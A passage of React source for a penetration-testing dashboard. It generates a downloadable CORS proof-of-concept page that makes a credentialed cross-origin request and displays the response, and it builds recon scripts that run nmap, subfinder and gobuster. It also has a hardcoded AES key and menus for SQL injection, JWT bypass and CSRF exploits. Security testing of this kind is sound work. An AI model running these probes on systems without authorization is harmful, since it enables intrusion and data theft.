    <b>Target URL:</b> ${sharedUrl}<br>
    <b>Reflected Origin:</b> ${item.origin}<br>
    <b>withCredentials:</b> ${withCreds ? 'true' : 'false'}<br>
    <b>Severity:</b> ${item.severity}
  </div>
  <button onclick="exploit()">🚀 Send Cross-Origin Request</button>
  <pre id="out">Click button above to execute cross-origin leak...</pre>
  <script>
    function exploit() {
      var out = document.getElementById('out');
      out.textContent = 'Sending request to target...';
      var xhr = new XMLHttpRequest();
      xhr.open('GET', '${sharedUrl}', true);
      xhr.withCredentials = ${withCreds ? 'true' : 'false'};
      xhr.onload = function() {
        out.textContent = 'HTTP ' + xhr.status + '\\n' +
          'Access-Control-Allow-Origin: ' + (xhr.getResponseHeader('Access-Control-Allow-Origin') || '(none)') + '\\n' +
          'Access-Control-Allow-Credentials: ' + (xhr.getResponseHeader('Access-Control-Allow-Credentials') || '(none)') + '\\n\\n' +
          xhr.responseText.substring(0, 4000);
      };
      xhr.onerror = function() {
        out.textContent = 'Request blocked by browser SOP or host error. Host this PoC directly on ${item.origin} to verify exploitation.';
      };
      xhr.send();
    }
  </script>
</body>
</html>`;

    const blob = new Blob([html], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cors_poc_${item.severity.toLowerCase()}_${item.label.replace(/\s+/g, '_')}.html`;
    a.click();
    URL.revokeObjectURL(url);
    showToast(`✓ Downloaded CORS PoC HTML for ${item.label}!`);
  };

  // Multi-Encoder & Crypto Utilities
  const [encoderMode, setEncoderMode] = useState('base64');
  const [encoderInput, setEncoderInput] = useState('admin=true&role=security_auditor');
  const [encoderOutput, setEncoderOutput] = useState('');
  const [hashProbeInput, setHashProbeInput] = useState('');
  const [identifiedHash, setIdentifiedHash] = useState(null);

  useEffect(() => {
    try {
      if (!encoderInput) {
        setEncoderOutput('');
        return;
      }
      switch (encoderMode) {
        case 'base64':
          setEncoderOutput(btoa(encoderInput));
          break;
        case 'base64_decode':
          setEncoderOutput(atob(encoderInput));
          break;
        case 'url_encode':
          setEncoderOutput(encodeURIComponent(encoderInput));
          break;
        case 'url_decode':
          setEncoderOutput(decodeURIComponent(encoderInput));
          break;
        case 'hex_encode':
          setEncoderOutput(Array.from(encoderInput).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(''));
          break;
        case 'hex_decode':
          setEncoderOutput(encoderInput.match(/.{1,2}/g)?.map(byte => String.fromCharCode(parseInt(byte, 16))).join('') || '');
          break;
        case 'rot13':
          setEncoderOutput(encoderInput.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)));
          break;
        case 'md5':
          setEncoderOutput(CryptoJS.MD5(encoderInput).toString());
          break;
        case 'sha1':
          setEncoderOutput(CryptoJS.SHA1(encoderInput).toString());
          break;
        case 'sha256':
          setEncoderOutput(CryptoJS.SHA256(encoderInput).toString());
          break;
        case 'sha512':
          setEncoderOutput(CryptoJS.SHA512(encoderInput).toString());
          break;
        case 'aes_encrypt':
          const aes = new AesUtil(128, 1000);
          setEncoderOutput(aes.encode('a1b2c3d4e5f60718', '1020304050607080', 'SecuritySecret123', encoderInput));
          break;
        case 'aes_decrypt':
          const aesDec = new AesUtil(128, 1000);
          setEncoderOutput(aesDec.decode(encoderInput, 'SecuritySecret123'));
          break;
        default:
          setEncoderOutput(encoderInput);
      }
    } catch (e) {
      setEncoderOutput(`[Conversion Error]: ${e.message}`);
    }
  }, [encoderInput, encoderMode]);

  const identifyHashType = (hash) => {
    const h = hash.trim();
    if (!h) {
      setIdentifiedHash(null);
      return;
    }
    const len = h.length;
    let candidates = [];
    if (/^[a-fA-F0-9]{32}$/.test(h)) candidates.push('MD5', 'NTLM', 'MD4');
    else if (/^[a-fA-F0-9]{40}$/.test(h)) candidates.push('SHA-1', 'MySQL 4.1+', 'RIPEMD-160');
    else if (/^[a-fA-F0-9]{64}$/.test(h)) candidates.push('SHA-256', 'HMAC-SHA256');
    else if (/^[a-fA-F0-9]{128}$/.test(h)) candidates.push('SHA-512', 'Whirlpool');
    else if (/^\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}$/.test(h)) candidates.push('bcrypt');
    else if (/^\$argon2(i|d|id)\$/.test(h)) candidates.push('Argon2');
    else if (h.split('.').length === 3) candidates.push('JSON Web Token (JWT)');
    else candidates.push('Unknown / Custom Encoding');

    setIdentifiedHash({ hash: h, length: len, candidates });
  };

  const downloadReconScript = (type = 'sh') => {
    const host = currentHost;
    let script = '';
    if (type === 'sh') {
      script = `#!/usr/bin/env bash
# CYBERSHIELD AUTOMATED RECON SUITE FOR ${host}
TARGET="${host}"
OUTDIR="./recon_${TARGET}"
mkdir -p "$OUTDIR"

echo "[+] Starting Nmap Port Scan on $TARGET..."
nmap -sV -sC -Pn -p- -T4 "$TARGET" -oN "$OUTDIR/nmap_full.txt"

echo "[+] Discovering Subdomains..."
subfinder -d "$TARGET" -o "$OUTDIR/subdomains.txt"

echo "[+] Probing HTTP Security Headers..."
curl -I "https://$TARGET" > "$OUTDIR/headers.txt"

echo "[+] Testing Clickjacking & Framing..."
curl -s -I "https://$TARGET" | grep -i -E "x-frame-options|frame-ancestors" > "$OUTDIR/clickjacking_headers.txt"

echo "[+] Directory Bruteforce..."
gobuster dir -u "https://$TARGET" -w /usr/share/wordlists/dirb/common.txt -o "$OUTDIR/gobuster.txt"

echo "[✓] Recon completed! Results stored in $OUTDIR"
`;
    } else {
      script = `@echo off
REM CYBERSHIELD WINDOWS RECON FOR ${host}
set TARGET=${host}
set OUTDIR=recon_%TARGET%
mkdir %OUTDIR%

echo [+] Running Ping / DNS Check on %TARGET%...
nslookup %TARGET% > %OUTDIR%\\dns.txt

echo [+] Testing Port 80 & 443 Connectivity...
powershell -Command "Test-NetConnection -ComputerName %TARGET% -Port 443" > %OUTDIR%\\port443.txt

echo [+] Fetching HTTP Headers...
powershell -Command "Invoke-WebRequest -Uri https://%TARGET% -Method Head | Select-Object -ExpandProperty Headers" > %OUTDIR%\\headers.txt

echo [✓] Recon sequence finished.
`;
    }

    const blob = new Blob([script], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `recon_${host}.${type}`;
    a.click();
    URL.revokeObjectURL(url);
    showToast(`✓ Downloaded ${type.toUpperCase()} recon script!`);
  };

  const downloadConsoleLogs = (ext = 'txt') => {
    const text = activeScanResult?.rawOutput || orchestratorLogs || 'No logs generated.';
    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `vapt_console_log_${currentHost}_${Date.now()}.${ext}`;
    a.click();
    URL.revokeObjectURL(url);
    showToast('✓ Console logs downloaded!');
  };

  return (
    <div className="page-wrapper security-tools-studio">
      {/* 1. TOP SCOPE BAR & PROJECT SELECTOR */}
      <div className="scope-orchestrator-bar">
        <div className="scope-left-group">
          <div className="scope-badge">
            <Shield size={16} className="scope-shield-icon" />
            <span>VAPT SCOPE BINDING</span>
          </div>

          <div className="project-selector-wrapper">
            <select
              className="project-scope-dropdown"
              value={selectedProjectId}
              onChange={handleProjectSelect}
            >
              <option value="CUSTOM">⚡ Custom Target URL (Ad-hoc Scan)</option>
              {projects.map(p => (
                <option key={p.id} value={String(p.id)}>
                  📁 {p.project_name} ({p.project_code || `VAPT-${p.id}`}) — {p.target_url}
                </option>
              ))}
            </select>
          </div>

          <div className="target-input-wrapper">
            <Globe size={15} className="target-globe-icon" />
            <input
              type="text"
              className="target-scope-input"
              value={sharedUrl}
              onChange={(e) => setSharedUrl(e.target.value)}
              placeholder="https://target.gov.in"
            />
          </div>
        </div>

        {/* Right Action: Launch 1-Click Multi-Stage Orchestrator */}
        <div className="scope-right-group">
          <button
            type="button"
            className={`mode-toggle-btn ${aggressiveMode ? 'active' : ''}`}
            onClick={() => setAggressiveMode(!aggressiveMode)}
            title="Toggle Deep / Aggressive Assessment"
          >
            <Zap size={14} />
            <span>{aggressiveMode ? 'Deep Audit (Aggressive)' : 'Standard Safe Mode'}</span>
          </button>

          <button
            type="button"
            className="launch-orchestrator-btn"
            onClick={runAutomatedVaptPipeline}
            disabled={isOrchestratorRunning}
          >
            <Play size={15} />
            <span>{isOrchestratorRunning ? 'Orchestrating VAPT...' : '⚡ Launch Full Automated Audit'}</span>
          </button>
        </div>
      </div>

      {/* 2. MULTI-STAGE PROGRESS TRACKER (When Orchestrator is Running / Finished) */}
      {(isOrchestratorRunning || orchestratorStage > 0) && (
        <div className="orchestrator-tracker-card">
          <div className="tracker-header">
            <div className="tracker-title">
              <Sparkles size={16} color="var(--accent-cyan)" />
              <strong>Autonomous Multi-Stage VAPT Pipeline</strong>
            </div>
            <span className="tracker-status-tag">
              {isOrchestratorRunning ? `Running Stage ${orchestratorStage}/5...` : '✓ Pipeline Run Complete'}
            </span>
          </div>

          <div className="stepper-stages-bar">
            {[
              { num: 1, label: 'TCP Ports & Services' },
              { num: 2, label: 'DNS & Subdomains' },
              { num: 3, label: 'SSL & Security Headers' },
              { num: 4, label: 'Files, Clickjack & CORS' },
              { num: 5, label: 'Findings Aggregation' }
            ].map(s => {
              const isDone = orchestratorStage > s.num || (!isOrchestratorRunning && orchestratorStage === 5);
              const isCurrent = isOrchestratorRunning && orchestratorStage === s.num;
              return (
                <div key={s.num} className={`pipeline-stage-step ${isDone ? 'done' : ''} ${isCurrent ? 'current' : ''}`}>
                  <div className="stage-step-circle">
                    {isDone ? <Check size={12} /> : s.num}
                  </div>
                  <span className="stage-step-label">{s.label}</span>
                </div>
              );
            })}
          </div>

          {accumulatedFindings.length > 0 && (
            <div className="findings-quick-sync-strip">
              <span>Discovered <strong>${accumulatedFindings.length} actionable vulnerabilities</strong> in this automated pass.</span>
              <button
                type="button"
                className="push-all-db-btn"
                onClick={() => handlePushAllFindingsToProject(accumulatedFindings)}
              >
                <BookmarkPlus size={14} />
                <span>Push All {accumulatedFindings.length} Findings to Project Report</span>
              </button>
            </div>
          )}
        </div>
      )}

      {/* 3. 4-PHASE GUIDED VAPT STEPPER */}
      <div className="vapt-phases-nav-stepper">
        {[
          {
            id: 'phase1',
            number: '01',
            title: 'Recon & Surface Discovery',
            desc: 'Ports, DNS, SSL & Tech Fingerprints',
            icon: Search,
            defaultTool: 'ports'
          },
          {
            id: 'phase2',
            number: '02',
            title: 'Vulnerability Audit & Posture',
            desc: 'Headers, Sensitive Files & Nuclei CVEs',
            icon: ShieldAlert,
            defaultTool: 'headers'
          },
          {
            id: 'phase3',
            number: '03',
            title: 'Active DAST & Exploit Probes',
            desc: 'CORS, Clickjacking, CSRF & Payloads',
            icon: Flame,
            defaultTool: 'cors'
          },
          {
            id: 'phase4',
            number: '04',
            title: 'Cryptographic & Token Lab',
            desc: 'AES-PBKDF2, JWT Bypass, Hash Identifier & Scripts',
            icon: Key,
            defaultTool: 'jwt'
          }
        ].map(phase => {
          const isActive = currentPhase === phase.id;
          const Icon = phase.icon;
          return (
            <div
              key={phase.id}
              className={`stepper-phase-tile ${isActive ? 'active' : ''}`}
              onClick={() => {
                setCurrentPhase(phase.id);
                setActiveSubTool(phase.defaultTool);
              }}
            >
              <div className="stepper-tile-left">
                <span className="stepper-tile-num">{phase.number}</span>
                <div className="stepper-text-group">
                  <span className="stepper-tile-title">{phase.title}</span>
                  <span className="stepper-tile-desc">{phase.desc}</span>
                </div>
              </div>
              <Icon size={18} className="stepper-tile-icon" />
            </div>
          );
        })}
      </div>

      {/* 4. ACTIVE PHASE CONTENT & TOOLS */}
      <div className="tools-main-workspace-card">
        {/* Sub-tool Category Switcher Pills */}
        <div className="phase-subtool-pills-bar">
          {currentPhase === 'phase1' && (
            <>
              {[
                { id: 'ports', label: 'Port & Service Scanner (TCP)', icon: Server },
                { id: 'dns', label: 'DNS & Subdomains (Subfinder)', icon: Globe },
                { id: 'ssl', label: 'SSL/TLS Certificate Inspector', icon: Lock },
                { id: 'whatweb', label: 'WhatWeb Tech Stack Fingerprinter', icon: Eye }
              ].map(t => (
                <button
                  key={t.id}
                  type="button"
                  className={`phase-pill-btn ${activeSubTool === t.id ? 'active' : ''}`}
                  onClick={() => setActiveSubTool(t.id)}
                >
                  <t.icon size={14} />
                  <span>{t.label}</span>
                </button>
              ))}
            </>
          )}

          {currentPhase === 'phase2' && (
            <>
              {[
                { id: 'headers', label: 'Security Headers Auditor (shcheck)', icon: ShieldCheck },
                { id: 'files', label: 'Sensitive File & Route Prober', icon: FileSearch },
                { id: 'nuclei', label: 'Nuclei CVE & Misconfig Scanner', icon: Zap },
                { id: 'gobuster', label: 'Gobuster / Dirsearch Directory Fuzzer', icon: Layers }
              ].map(t => (
                <button
                  key={t.id}
                  type="button"
                  className={`phase-pill-btn ${activeSubTool === t.id ? 'active' : ''}`}
                  onClick={() => setActiveSubTool(t.id)}
                >
                  <t.icon size={14} />
                  <span>{t.label}</span>
                </button>
              ))}
            </>
          )}

          {currentPhase === 'phase3' && (
            <>
              {[
                { id: 'cors', label: 'CORS Misconfiguration Tester', icon: ArrowRightLeft },
                { id: 'clickjacking', label: 'Clickjacking (UI Redressing) Sandbox', icon: MousePointer },
                { id: 'csrf', label: 'CSRF PoC Exploit Studio', icon: FileCode },
                { id: 'payloads', label: 'OWASP Vulnerability Payloads Workshop', icon: Zap },
                { id: 'sqlmap', label: 'SQLMap Database Auditor & Injection', icon: Database },
                { id: 'dalfox', label: 'Dalfox Reflected XSS Verifier', icon: Flame }
              ].map(t => (
                <button
                  key={t.id}
                  type="button"
                  className={`phase-pill-btn ${activeSubTool === t.id ? 'active' : ''}`}
                  onClick={() => setActiveSubTool(t.id)}
                >
                  <t.icon size={14} />
                  <span>{t.label}</span>
                </button>
              ))}
            </>
          )}

          {currentPhase === 'phase4' && (
            <>
              {[
                { id: 'jwt', label: 'JWT Token Debugger & Alg:None', icon: Key },
                { id: 'crypto_intruder', label: 'AES PBKDF2 & Crypto Intruder', icon: Lock },
                { id: 'encoder', label: 'Multi-Encoder, AES & Hash Identifier', icon: Hash },
                { id: 'scripts', label: 'Download Recon Scripts (.sh/.bat)', icon: Download }
              ].map(t => (
                <button
                  key={t.id}
                  type="button"
                  className={`phase-pill-btn ${activeSubTool === t.id ? 'active' : ''}`}
                  onClick={() => setActiveSubTool(t.id)}
                >
                  <t.icon size={14} />
                  <span>{t.label}</span>
                </button>
              ))}
            </>
          )}
        </div>

        {/* ----------------- PHASE 1 TOOLS ----------------- */}
        {currentPhase === 'phase1' && activeSubTool === 'ports' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">Fast TCP Port Scanner & Banner Fingerprinter</h3>
                <p className="tool-desc">Conducts asynchronous socket connects across critical TCP service ports (HTTP, SSH, MySQL, Redis, RDP, etc.).</p>
              </div>
              <div className="tool-actions-right">
                <select
                  className="preset-select"
                  value={portProfile}
                  onChange={(e) => setPortProfile(e.target.value)}
                >
                  <option value="top20">Top 20 Critical Ports</option>
                  <option value="top100">Top 100 Standard Web Ports</option>
                  <option value="top1000">Top 1000 Deep Port Audit</option>
                </select>
                <button
                  type="button"
                  onClick={runPortScan}
                  disabled={portScanning}
                  className="neo-glass-btn primary"
                >
                  <Play size={14} />
                  <span>{portScanning ? 'Scanning Ports...' : 'Scan Ports'}</span>
                </button>
              </div>
            </div>

            {/* Results */}
            {portResults ? (
              <div className="tool-results-surface">
                <div className="summary-badge-strip">
                  <span className="metric-chip">Scanned: {portResults.totalScanned} ports</span>
                  <span className="metric-chip highlight">Open: {portResults.openPorts?.length || 0}</span>
                  <span className="metric-chip">Duration: {portResults.duration}</span>
                </div>

                <div className="ports-grid">
                  {portResults.openPorts?.map((p, i) => (
                    <div key={i} className="port-item-card">
                      <div className="port-head">
                        <span className="port-number">#{p.port}</span>
                        <span className="port-service-name">{p.service}</span>
                      </div>
                      <span className="port-state-pill open">OPEN</span>
                      {p.banner && <p className="port-banner-text">{p.banner}</p>}
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              <div className="tool-readiness-deck">
                <div className="readiness-header">
                  <div className="readiness-title">
                    <Sliders size={16} color="var(--accent-cyan)" />
                    <strong>Scan Parameters & Target Scope Specification</strong>
                  </div>
                  <span className="readiness-status-tag">Ready to Scan</span>
                </div>
                <div className="readiness-grid">
                  <div className="readiness-card">
                    <span className="rc-label">TARGET HOST</span>
                    <span className="rc-value mono">{portScanTarget || currentHost}</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">SELECTED PROFILE</span>
                    <span className="rc-value">{portProfile === 'top20' ? 'Top 20 Critical Ports' : portProfile === 'top100' ? 'Top 100 Standard Web & Infra Ports' : 'Top 1000 Deep Port Audit'}</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">SOCKET CONCURRENCY</span>
                    <span className="rc-value highlight">25 Parallel Workers</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">DETECTION PROTOCOLS</span>
                    <span className="rc-value">HTTP, HTTPS, SSH, MySQL, Postgres, Redis, RDP</span>
                  </div>
                </div>
                <div className="readiness-quick-action-strip">
                  <span>💡 Tip: Select <strong>Top 100 Standard Web Ports</strong> for the best balance between scan speed and vulnerability discovery.</span>
                  <button type="button" onClick={runPortScan} disabled={portScanning} className="neo-glass-btn primary">
                    <Play size={14} />
                    <span>{portScanning ? 'Scanning Ports...' : 'Start Port Scan Now'}</span>
                  </button>
                </div>
              </div>
            )}
          </div>
        )}

        {currentPhase === 'phase1' && activeSubTool === 'dns' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">DNS Multi-Record Enumeration & Topology</h3>
                <p className="tool-desc">Retrieves A, AAAA, MX, TXT (SPF/DKIM/DMARC), NS, CNAME, and SOA DNS mappings.</p>
              </div>
              <button
                type="button"
                onClick={runDnsRecon}
                disabled={dnsScanning}
                className="neo-glass-btn primary"
              >
                <Globe size={14} />
                <span>{dnsScanning ? 'Querying DNS...' : 'Enumerate DNS'}</span>
              </button>
            </div>

            {dnsResults ? (
              <div className="tool-results-surface">
                <div className="dns-records-grid">
                  {Object.entries(dnsResults.records || {}).map(([type, records]) => (
                    <div key={type} className="dns-record-card">
                      <div className="record-header">
                        <span className="record-type-badge">{type}</span>
                        <span className="record-count">{Array.isArray(records) ? records.length : 1} entry</span>
                      </div>
                      <div className="record-body">
                        {Array.isArray(records) ? (
                          records.map((r, i) => <div key={i} className="record-line mono">{typeof r === 'object' ? JSON.stringify(r) : r}</div>)
                        ) : (
                          <div className="record-line mono">{typeof records === 'object' ? JSON.stringify(records) : records}</div>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              <div className="tool-readiness-deck">
                <div className="readiness-header">
                  <div className="readiness-title">
                    <Globe size={16} color="var(--accent-cyan)" />
                    <strong>DNS Multi-Record Query Configuration</strong>
                  </div>
                  <span className="readiness-status-tag">Resolver Ready</span>
                </div>
                <div className="readiness-grid">
                  <div className="readiness-card">
                    <span className="rc-label">QUERY DOMAIN</span>
                    <span className="rc-value mono">{dnsDomain || currentHost}</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">RESOLVER ENGINE</span>
                    <span className="rc-value">Multi-Record DNS Socket</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">RECORD PROFILES</span>
                    <span className="rc-value highlight">A, AAAA, MX, TXT, NS, CNAME, SOA</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">SPF/DKIM/DMARC AUDIT</span>
                    <span className="rc-value">Automated TXT Parsing</span>
                  </div>
                </div>
                <div className="readiness-quick-action-strip">
                  <span>💡 Tip: DNS records reveal mail servers, subdomains, third-party service mappings, and SPF/DMARC anti-spoofing posture.</span>
                  <button type="button" onClick={runDnsRecon} disabled={dnsScanning} className="neo-glass-btn primary">
                    <Globe size={14} />
                    <span>{dnsScanning ? 'Querying DNS...' : 'Enumerate All DNS Records'}</span>
                  </button>
                </div>
              </div>
            )}
          </div>
        )}

        {currentPhase === 'phase1' && activeSubTool === 'ssl' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">SSL / TLS Certificate & Cipher Suite Inspector</h3>
                <p className="tool-desc">Audits X.509 certificates, Subject Alternative Names (SANs), cipher suites, expiry dates, and issuer trust chains.</p>
              </div>
              <button
                type="button"
                onClick={runSslCheck}
                disabled={sslScanning}
                className="neo-glass-btn primary"
              >
                <Lock size={14} />
                <span>{sslScanning ? 'Inspecting TLS...' : 'Inspect SSL/TLS'}</span>
              </button>
            </div>

            {sslResults ? (
              <div className="tool-results-surface">
                {sslResults.error ? (
                  <div className="error-banner"><AlertTriangle size={16} /><span>{sslResults.error}</span></div>
                ) : (
                  <div className="ssl-details-grid">
                    <div className="ssl-tile">
                      <span className="ssl-lbl">Subject Common Name</span>
                      <span className="ssl-val">{sslResults.subject?.CN || 'N/A'}</span>
                    </div>
                    <div className="ssl-tile">
                      <span className="ssl-lbl">Issuer Authority</span>
                      <span className="ssl-val">{sslResults.issuer?.O || sslResults.issuer?.CN || 'N/A'}</span>
                    </div>
                    <div className="ssl-tile">
                      <span className="ssl-lbl">Validity Remaining</span>
                      <span className="ssl-val highlight">{sslResults.daysRemaining} Days</span>
                    </div>
                    <div className="ssl-tile">
                      <span className="ssl-lbl">Active Protocol & Cipher</span>
                      <span className="ssl-val mono">{sslResults.cipher?.name || 'N/A'} ({sslResults.protocol || 'TLS'})</span>
                    </div>
                  </div>
                )}
              </div>
            ) : (
              <div className="tool-readiness-deck">
                <div className="readiness-header">
                  <div className="readiness-title">
                    <Lock size={16} color="var(--accent-cyan)" />
                    <strong>TLS Handshake & Certificate Verification Profile</strong>
                  </div>
                  <span className="readiness-status-tag">X.509 Engine Ready</span>
                </div>
                <div className="readiness-grid">
                  <div className="readiness-card">
                    <span className="rc-label">TARGET ENDPOINT</span>
                    <span className="rc-value mono">{sslHost}:{sslPort}</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">PROTOCOLS TESTED</span>
                    <span className="rc-value">TLSv1.2, TLSv1.3</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">TRUST CHAIN CHECK</span>
                    <span className="rc-value highlight">CA Signature & Days Remaining</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">SANs EXTRACTION</span>
                    <span className="rc-value">Subject Alternative Names</span>
                  </div>
                </div>
                <div className="readiness-quick-action-strip">
                  <span>💡 Tip: Ensures certificate is valid, not expiring soon, and does not negotiate weak ciphers like RC4 or 3DES.</span>
                  <button type="button" onClick={runSslCheck} disabled={sslScanning} className="neo-glass-btn primary">
                    <Lock size={14} />
                    <span>{sslScanning ? 'Inspecting TLS...' : 'Inspect SSL/TLS Certificate'}</span>
                  </button>
                </div>
              </div>
            )}
          </div>
        )}

        {currentPhase === 'phase1' && activeSubTool === 'whatweb' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">WhatWeb & Wappalyzer Fingerprinting Engine</h3>
                <p className="tool-desc">Identifies CMS frameworks, JavaScript libraries, server headers, and backend programming stacks.</p>
              </div>
              <button
                type="button"
                onClick={() => runSingleTool('whatweb', 'WhatWeb Fingerprinter')}
                disabled={runningToolId === 'whatweb'}
                className="neo-glass-btn primary"
              >
                <Eye size={14} />
                <span>{runningToolId === 'whatweb' ? 'Analyzing...' : 'Run Fingerprinting'}</span>
              </button>
            </div>
            <p className="helper-notice">Fingerprinting output will display in real-time within the Cyber Console below.</p>
          </div>
        )}

        {/* ----------------- PHASE 2 TOOLS ----------------- */}
        {currentPhase === 'phase2' && activeSubTool === 'headers' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">HTTP Security Headers Compliance Guard (shcheck)</h3>
                <p className="tool-desc">Evaluates Content-Security-Policy (CSP), Strict-Transport-Security (HSTS), X-Frame-Options, X-Content-Type-Options, and Permissions-Policy.</p>
              </div>
              <button
                type="button"
                onClick={runHeaderScan}
                disabled={headerScanning}
                className="neo-glass-btn primary"
              >
                <ShieldCheck size={14} />
                <span>{headerScanning ? 'Auditing Headers...' : 'Audit Security Headers'}</span>
              </button>
            </div>

            {headerResults ? (
              <div className="tool-results-surface">
                <div className="headers-split-view">
                  <div className="header-status-column">
                    <h4 className="column-title green"><CheckCircle2 size={14} /> Present Headers ({headerResults.present?.length || 0})</h4>
                    <div className="headers-cards-deck">
                      {headerResults.present?.map((h, i) => (
                        <div key={i} className="header-badge-card pass">
                          <strong>{h.name}</strong>
                          <span className="header-val-mono">{h.value}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div className="header-status-column">
                    <h4 className="column-title red"><AlertTriangle size={14} /> Missing Headers ({headerResults.missing?.length || 0})</h4>
                    <div className="headers-cards-deck">
                      {headerResults.missing?.map((m, i) => (
                        <div key={i} className="header-badge-card fail">
                          <strong>{m.name}</strong>
                          <span className="remediation-snippet">{m.remediation}</span>
                          <button
                            type="button"
                            onClick={() => handlePushFindingToProject({ title: `Missing Security Header: ${m.name}`, severity: 'LOW', desc: m.desc, remediation: m.remediation })}
                            className="push-report-mini-btn"
                          >
                            <BookmarkPlus size={12} /> Push to Project Report
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              <div className="tool-readiness-deck">
                <div className="readiness-header">
                  <div className="readiness-title">
                    <ShieldCheck size={16} color="var(--accent-cyan)" />
                    <strong>HTTP Security Headers Compliance Checklist (shcheck)</strong>
                  </div>
                  <span className="readiness-status-tag">OWASP ASVS Standard</span>
                </div>
                <div className="readiness-grid">
                  <div className="readiness-card">
                    <span className="rc-label">AUDIT TARGET</span>
                    <span className="rc-value mono">{sharedUrl}</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">CRITICAL HEADERS</span>
                    <span className="rc-value highlight">HSTS, CSP, X-Frame-Options</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">CORP/CORB/COOP</span>
                    <span className="rc-value">Cross-Origin Isolation Check</span>
                  </div>
                  <div className="readiness-card">
                    <span className="rc-label">COMPLIANCE STANDARD</span>
                    <span className="rc-value">CERT-In Security Guidelines & ASVS v4.0</span>
                  </div>
                </div>
                <div className="readiness-quick-action-strip">
                  <span>💡 Tip: Auditing security headers provides instant insight into defensive posture against XSS, clickjacking, and MITM.</span>
                  <button type="button" onClick={runHeaderScan} disabled={headerScanning} className="neo-glass-btn primary">
                    <ShieldCheck size={14} />
                    <span>{headerScanning ? 'Auditing Headers...' : 'Audit HTTP Security Headers'}</span>
                  </button>
                </div>
              </div>
            )}
          </div>
        )}

        {currentPhase === 'phase2' && activeSubTool === 'files' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">Sensitive File & Directory Exposure Prober</h3>
                <p className="tool-desc">Actively probes 15+ sensitive paths (/.env, /.git, /robots.txt, /phpinfo.php, /swagger.json, /dump.sql, /admin) for unauthorized exposure.</p>
              </div>
              <button
                type="button"
                onClick={runSensitiveProbes}
                disabled={probeScanning}
                className="neo-glass-btn primary"
              >
                <FileSearch size={14} />
                <span>{probeScanning ? 'Probing Paths...' : 'Probe Sensitive Files'}</span>
              </button>
            </div>

            {probeResults && (
              <div className="tool-results-surface">
                <div className="probe-results-table-wrap">
                  <table className="vapt-neo-table">
                    <thead>
                      <tr>
                        <th>Path</th>
                        <th>Category</th>
                        <th>Status Code</th>
                        <th>Severity</th>
                        <th>Action</th>
                      </tr>
                    </thead>
                    <tbody>
                      {probeResults.results?.map((r, i) => (
                        <tr key={i} className={r.isExposed ? 'row-exposed' : ''}>
                          <td className="mono"><strong>{r.path}</strong></td>
                          <td>{r.category}</td>
                          <td>
                            <span className={`status-code-chip status-${r.statusCode}`}>
                              {r.statusCode || 'Error'}
                            </span>
                          </td>
                          <td>
                            <span className={`sev-pill-mini ${r.severity?.toLowerCase()}`}>
                              {r.severity}
                            </span>
                          </td>
                          <td>
                            {r.isExposed && (
                              <button
                                type="button"
                                onClick={() => handlePushFindingToProject({ title: `Publicly Exposed ${r.name}`, severity: r.severity, desc: r.desc, remediation: 'Restrict access via web server rules.' })}
                                className="push-report-mini-btn"
                              >
                                Push to Report
                              </button>
                            )}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}
          </div>
        )}

        {currentPhase === 'phase2' && activeSubTool === 'nuclei' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">Nuclei Community Template Scanner</h3>
                <p className="tool-desc">Executes automated template rules targeting CVEs, critical exposures, server misconfigurations, and known framework exploits.</p>
              </div>
              <button
                type="button"
                onClick={() => runSingleTool('nuclei', 'Nuclei Vulnerability Scanner')}
                disabled={runningToolId === 'nuclei'}
                className="neo-glass-btn primary"
              >
                <Zap size={14} />
                <span>{runningToolId === 'nuclei' ? 'Running Nuclei...' : 'Launch Nuclei Scan'}</span>
              </button>
            </div>
            <p className="helper-notice">Scan results and CVE template detections will output directly to the Cyber Console.</p>
          </div>
        )}

        {currentPhase === 'phase2' && activeSubTool === 'gobuster' && (
          <div className="tool-inner-panel">
            <div className="tool-panel-top">
              <div>
                <h3 className="tool-title">Gobuster / Dirsearch Directory Fuzzer</h3>
                <p className="tool-desc">High-speed URI endpoint enumeration locating hidden routes, administration panels, and backup directories.</p>
              </div>
              <button
                type="button"
                onClick={() => runSingleTool('gobuster', 'Gobuster Directory Fuzzer')}
                disabled={runningToolId === 'gobuster'}
                className="neo-glass-btn primary"
              >
                <Layers size={14} />
                <span>{runningToolId === 'gobuster' ? 'Fuzzing...' : 'Launch Gobuster Fuzzer'}</span>
